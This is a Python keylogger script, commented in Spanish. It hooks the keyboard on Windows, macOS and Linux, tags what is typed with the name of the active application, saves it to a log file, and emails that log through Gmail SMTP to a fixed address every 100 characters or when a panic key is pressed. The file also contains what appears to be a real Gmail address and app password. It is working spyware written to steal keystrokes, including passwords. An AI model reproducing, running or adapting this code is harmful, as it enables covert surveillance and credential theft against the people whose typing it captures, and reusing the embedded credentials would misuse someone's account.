import os
import platform
import sys
import smtplib
import threading
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard

# ==========================================
# CONFIGURACIÓN DE EXFILTRACIÓN Y ARCHIVOS
# ==========================================
EMAIL_EMISOR = "josemanueldavalossanchez37@gmail.com"
EMAIL_PASSWORD = "vato ijpk ekys nefw"  
EMAIL_RECEPTOR = "josemanueldavalossanchez37@gmail.com"

N_CARACTERES = 100  
ARCHIVO_LOG = "actividad_log.txt"
TECLA_PANICO = keyboard.Key.f12 

# Variables globales
ventana_actual = ""
contador_caracteres = 0


def obtener_ventana_universal():
  sistema = platform.system()

  if sistema == "Windows":
    import pygetwindow as gw

    try:
      ventana = gw.getActiveWindow()
      return ventana.title if ventana else "Escritorio/Desconocido"
    except Exception:
      return "Escritorio/Desconocido"
  elif sistema == "Darwin":
    script = (
        'tell application "SystemEvents" to get name of (first process whose'
        ' frontmost is true)'
    )
    try:
      return os.popen(f"osascript -e '{script}'").read().strip()
    except Exception:
      return "Mac-Window"
  elif sistema == "Linux":
    try:
      return (
          os.popen(
              "xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5)"
              " WM_NAME | cut -d '\"' -f 2"
          )
          .read()
          .strip()
      )
    except Exception:
      return "Linux-Window"
  return "Desconocido"



def guardar_en_archivo(texto):
  """Escribe en el archivo .txt solo cuando hay nuevos caracteres."""
  if texto:
    with open(ARCHIVO_LOG, "a", encoding="utf-8") as f:
      f.write(texto)



def enviar_correo():
  """Envía el archivo acumulado por SMTP."""
  if not os.path.exists(ARCHIVO_LOG) or os.path.getsize(ARCHIVO_LOG) == 0:
    return

  try:
    msg = MIMEMultipart()
    msg["From"] = EMAIL_EMISOR
    msg["To"] = EMAIL_RECEPTOR
    msg["Subject"] = "Reporte de Actividad - KeyLogger (Hook)"

    cuerpo = "Adjunto el registro de actividad capturado."
    msg.attach(MIMEText(cuerpo, "plain"))

    with open(ARCHIVO_LOG, "rb") as adjunto:
      parte = MIMEBase("application", "octet-stream")
      parte.set_payload(adjunto.read())
      encoders.encode_base64(parte)
      parte.add_header(
          "Content-Disposition", f"attachment; filename={ARCHIVO_LOG}"
      )
      msg.attach(parte)

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(EMAIL_EMISOR, EMAIL_PASSWORD)
    server.send_message(msg)
    server.quit()

    print("\n[+] Exfiltración completada con éxito.")
  except Exception as e:
    print(f"\n[-] Error en la exfiltración: {e}")


def exfiltrar_en_hilo():
  """Ejecuta el envío en un hilo secundario para evitar congelar el listener."""
  hilo = threading.Thread(target=enviar_correo)
  hilo.start()


def procesar_entrada(texto):
  global contador_caracteres

  # 1. Guardar de manera local solo si hay nuevos datos
  guardar_en_archivo(texto)

  # 2. Incrementar contador de caracteres
  contador_caracteres += len(texto)

  # 3. Exfiltrar al llegar a N caracteres
  if contador_caracteres >= N_CARACTERES:
    exfiltrar_en_hilo()
    contador_caracteres = 0



def al_presionar(tecla):
  global ventana_actual

  
  if tecla == TECLA_PANICO:
    print("\n[!] ¡Tecla de pánico presionada! Exfiltrando datos...")
    exfiltrar_en_hilo()
    return

  # Detectar cambio de ventana activa
  nueva_ventana = obtener_ventana_universal()
  if nueva_ventana != ventana_actual:
    ventana_actual = nueva_ventana
    encabezado = (
        f"\n\n[ APLICACIÓN: {ventana_actual} ]\n" + ("-" * 30) + "\n"
    )
    print(encabezado, end="")
    procesar_entrada(encabezado)

 
  try:
    char = tecla.char
    print(char, end="", flush=True)
    procesar_entrada(char)
  except AttributeError:
    if tecla == keyboard.Key.space:
      rep = " "
    elif tecla == keyboard.Key.enter:
      rep = "\n"
    elif tecla == keyboard.Key.backspace:
      rep = "<-"
    else:
      rep = f"[{tecla.name}]"

    print(rep, end="", flush=True)
    procesar_entrada(rep)


def al_soltar(tecla):
  if tecla == keyboard.Key.esc:
    print("\n\n--- Finalizando monitor ---")
    return False

mensaje_inicio = ">>> INICIALIZANDO GANCHO (HOOK)...\n"
print(mensaje_inicio, end="", flush=True)
guardar_en_archivo(mensaje_inicio)  # <--- Corregido

escuchador = keyboard.Listener(
    on_press=al_presionar, on_release=al_soltar, suppress=True
)

mensaje_corriendo = f">>> KEYBOARD CORRIENDO.\n>>> (Envío automático cada {N_CARACTERES} caracteres | {TECLA_PANICO} para envío manual | ESC para salir)\n"
print(mensaje_corriendo, end="", flush=True)
guardar_en_archivo(mensaje_corriendo)  # <--- Corregido

with keyboard.Listener(
    on_press=al_presionar, on_release=al_soltar
) as escuchador:
  escuchador.join()